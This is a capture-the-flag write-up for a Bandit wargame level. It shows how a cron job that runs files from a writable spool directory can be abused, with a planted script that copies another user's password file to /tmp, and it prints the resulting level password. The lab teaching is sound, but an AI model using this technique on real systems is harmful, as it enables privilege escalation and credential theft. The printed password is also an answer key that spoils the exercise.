Level Goal:

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Steps to solve :

 

### **1. Check the cron job**

```bash
cat /etc/cron.d/cronjob_bandit24

```

You see:

```
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

```

➡️ This means: every minute, the script `/usr/bin/cronjob_bandit24.sh` runs as **user bandit24**.

---

### **2. Inspect the script**

```bash
cat /usr/bin/cronjob_bandit24.sh

```

The script:

- Switches to `/var/spool/bandit24/foo`
- Runs every file inside that directory
- Only executes scripts if the **owner is bandit23**
- After executing, deletes them

💡 Translation:

> As bandit23, you can place your own script inside /var/spool/bandit24/foo. The cron will run it as bandit24 (who has access to /etc/bandit_pass/bandit24).
> 

---

### **3. Prepare your script**

Make a script that copies bandit24’s password into a file you control (e.g., `/tmp/game1234/password24_received`).

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/game1234/password24_received

```

Save it as `get.sh`.

---

### **4. Make it executable**

```bash
chmod 777 get.sh

```

(You actually only need `chmod +x get.sh`, but 777 works too.)

---

### **5. Place it where cron will run it**

```bash
cp get.sh /var/spool/bandit24/foo

```

Now your script is waiting there.

---

### **6. Wait for cron**

Within one minute, cron will:

- See `get.sh`
- Notice it’s owned by `bandit23`
- Execute it as `bandit24`
- Your script will dump the password to `/tmp/game1234/password24_received`

---

### **7. Read the password**

```bash
cat /tmp/game1234/password24_received

```

You got:

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

```

That’s the password for **bandit24** ✅

---

## 📌 Summary of Logic

1. **Cron runs a script** as bandit24.
2. That script **executes files owned by bandit23** in `/var/spool/bandit24/foo`.
3. So you place a malicious script there that copies the password.
4. Cron executes it for you.
5. You retrieve the password from your `/tmp` folder.
    
    ![image alt](https://github.com/SongaPraneeth/CTF/blob/3d95217f6498d1b845e4fcc465afe215e5eea7c1/CTFs%20Write%20ups/images/bandit_images/bandit23.png)
    
    ![image alt](https://github.com/SongaPraneeth/CTF/blob/3d95217f6498d1b845e4fcc465afe215e5eea7c1/CTFs%20Write%20ups/images/bandit_images/bandit23.1.png)